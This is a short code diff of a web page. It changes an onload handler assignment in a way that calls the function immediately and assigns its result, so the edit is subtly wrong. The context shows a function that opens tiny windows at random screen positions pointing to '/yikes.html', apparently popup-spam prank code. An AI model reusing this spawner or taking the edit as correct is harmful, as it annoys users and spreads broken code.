@@ -166,7 +166,7 @@
         }
 
         // Call the openOverlay function when the page loads (you can call it wherever you need)
-        window.onload = openOverlay;
+        window.onload = openOverlay();
     
         function openWin() {
            w = window.open('/yikes.html?'+Math.random(), Math.floor((Math.random()*window.screen.availWidth)+1), "width=10, height=10");
